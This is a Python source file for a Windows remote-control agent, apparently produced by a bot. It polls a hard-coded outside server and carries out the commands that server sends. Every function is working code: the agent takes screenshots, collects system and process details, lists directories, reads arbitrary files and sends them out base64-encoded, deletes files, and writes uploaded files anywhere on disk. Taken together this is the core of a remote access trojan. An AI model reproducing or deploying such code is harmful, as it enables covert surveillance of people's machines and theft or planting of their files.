# agent/agent_poll.py  (Windows)
import os, time, json, base64, socket
import requests, psutil, platform, uuid, io
from PIL import ImageGrab

# настройки (вшиты сервер и activation key при генерации архива ботом)
# если запускаете вручную, укажите здесь:
SERVER_URL = "http://158.160.164.124:5000"   # ваш сервер
# Если вы хотите, вставляйте реальный ключ, иначе пустая строка
ACTIVATION_KEY = ""  

# unique computer id
def gen_hash():
    try:
        return "_".join([platform.node(), str(psutil.virtual_memory().total), str(uuid.getnode())])
    except:
        return str(uuid.uuid4())
COMPUTER_HASH = gen_hash()

POLL_INTERVAL = 10

def register_once():
    # optional: we just ensure server has record when polling
    try:
        r = requests.post(SERVER_URL + "/poll", json={"computer_hash": COMPUTER_HASH}, timeout=10)
        # ignore response here
    except:
        pass

def do_screenshot():
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="JPEG")
        return {"status":"done", "result": base64.b64encode(buf.getvalue()).decode()}
    except Exception as e:
        return {"status":"failed", "result": str(e)}

def do_system_info():
    try:
        info = {"os": platform.platform(), "cpu": platform.processor(), "memory_gb": psutil.virtual_memory().total // (1024**3), "hostname": socket.gethostname(), "ip": socket.gethostbyname(socket.gethostname())}
        return {"status":"done", "result": json.dumps(info)}
    except Exception as e:
        return {"status":"failed", "result": str(e)}

def do_processes():
    try:
        procs = []
        for p in psutil.process_iter(["pid","name","cpu_percent","memory_percent"]):
            try:
                procs.append(p.info)
            except: pass
        return {"status":"done", "result": json.dumps(procs)}
    except Exception as e:
        return {"status":"failed", "result": str(e)}

def do_list_files(path):
    try:
        items=[]
        for name in os.listdir(path):
            full = os.path.join(path, name)
            items.append({"name":name, "is_dir": os.path.isdir(full), "size": os.path.getsize(full) if os.path.isfile(full) else None})
        return {"status":"done", "result": json.dumps(items)}
    except Exception as e:
        return {"status":"failed", "result": str(e)}

def do_download(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        payload = {"name": os.path.basename(path), "file_b64": base64.b64encode(data).decode()}
        return {"status":"done", "result": json.dumps(payload)}
    except Exception as e:
        return {"status":"failed", "result": str(e)}

def do_delete(path):
    try:
        os.remove(path)
        return {"status":"done", "result": "deleted"}
    except Exception as e:
        return {"status":"failed", "result": str(e)}

def do_upload(target_path, file_b64):
    try:
        data = base64.b64decode(file_b64)
        dirp = os.path.dirname(target_path)
        if dirp and not os.path.exists(dirp):
            os.makedirs(dirp, exist_ok=True)
        with open(target_path, "wb") as f:
            f.write(data)
        return {"status":"done", "result": "saved"}
    except Exception as e:
        return {"status":"failed", "result": str(e)}

def poll_loop():
    register_once()
    while True:
        try:
            r = requests.post(SERVER_URL + "/poll", json={"computer_hash": COMPUTER_HASH}, timeout=20)
            j = r.json()
            if j.get("success"):
                cmds = j.get("commands", [])
                for c in cmds:
                    cid = c["id"]; cmd = c["command"]; payload = c["payload"]
                    # payload may be "" or a stringified dict
                    result_obj = {"status":"failed", "result":"unknown"}
                    try:
                        if cmd == "screenshot":
                            result_obj = do_screenshot()
                        elif cmd == "system_info":
                            result_obj = do_system_info()
                        elif cmd == "processes":
                            result_obj = do_processes()
                        elif cmd == "list_files":
                            result_obj = do_list_files(payload)
                        elif cmd == "download":
                            result_obj = do_download(payload)
                        elif cmd == "delete":
                            result_obj = do_delete(payload)
                        elif cmd == "upload":
                            # payload is string representation of dict {"target_path":..., "name":..., "file_b64":...}
                            import ast
                            p = ast.literal_eval(payload)
                            result_obj = do_upload(p.get("target_path"), p.get("file_b64"))
                        else:
                            result_obj = {"status":"failed", "result":"unknown command"}
                    except Exception as e:
                        result_obj = {"status":"failed", "result": str(e)}
                    # POST result back
                    try:
                        requests.post(SERVER_URL + "/result", json={"id": cid, "status": result_obj["status"], "result": result_obj["result"]}, timeout=15)
                    except Exception:
                        pass
        except Exception as e:
            # ignore transient errors
            pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    print("Agent starting. Computer hash:", COMPUTER_HASH)
    poll_loop()
